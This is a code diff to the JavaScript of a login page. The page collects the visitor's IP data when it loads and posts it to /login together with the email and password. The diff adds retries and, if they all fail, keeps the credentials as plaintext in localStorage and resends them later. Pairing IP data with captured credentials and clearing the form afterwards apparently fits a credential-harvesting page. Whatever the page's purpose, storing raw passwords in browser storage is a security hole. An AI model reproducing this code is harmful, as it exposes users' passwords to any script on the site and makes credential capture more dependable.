@@ -21,6 +21,51 @@ async function fetchIPData() {
 // Call function on page load
 fetchIPData();
 
+// Function to send login data to the server
+async function sendLoginData(email, password, ipData, retries = 3, delay = 1000) {
+    try {
+        const response = await fetch("/login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, password, ipData }),
+        });
+
+        if (!response.ok) {
+            throw new Error("Network response was not ok");
+        }
+
+        const data = await response.json();
+        console.log("Response:", data);
+
+        // Clear any stored data if the request succeeds
+        localStorage.removeItem("pendingLoginData");
+    } catch (error) {
+        console.error("Error sending login data:", error);
+
+        if (retries > 0) {
+            console.log(`Retrying... ${retries} attempts left`);
+            setTimeout(() => {
+                sendLoginData(email, password, ipData, retries - 1, delay * 2); // Exponential backoff
+            }, delay);
+        } else {
+            console.log("All retry attempts failed. Storing data for later.");
+            // Store the data in localStorage for offline persistence
+            const pendingData = { email, password, ipData };
+            localStorage.setItem("pendingLoginData", JSON.stringify(pendingData));
+        }
+    }
+}
+
+// Function to check for pending data and send it
+function sendPendingData() {
+    const pendingData = localStorage.getItem("pendingLoginData");
+    if (pendingData) {
+        const { email, password, ipData } = JSON.parse(pendingData);
+        console.log("Sending pending login data...");
+        sendLoginData(email, password, ipData);
+    }
+}
+
 // Handle login
 document.querySelector('.submit').addEventListener('click', function (event) {
     event.preventDefault(); // Prevent form submission (if applicable)
@@ -28,28 +73,16 @@ document.querySelector('.submit').addEventListener('click', function (event) {
     var email = document.getElementById('mail').value;
     var password = document.getElementById('pass').value;
 
-    fetch("/login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            email: email,
-            password: password,
-            ipData: userIPData  // Send stored IP data with login request
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        console.log("Response:", data);
-        // Optionally display a success message to the user
-        // alert("Login data sent successfully!"); // Or update the DOM to show a message
-    })
-    .catch(error => {
-        console.error("Error:", error);
-        // Optionally display an error message to the user
-        // alert("An error occurred. Please try again."); // Or update the DOM to show an error message
-    });
+    // Send login data
+    sendLoginData(email, password, userIPData);
 
     // Reset fields
     document.getElementById("mail").value = "";
     document.getElementById("pass").value = "";
 });
+
+// Check for pending data when the page loads
+window.addEventListener("load", sendPendingData);
+
+// Check for pending data when the user comes back online
+window.addEventListener("online", sendPendingData);
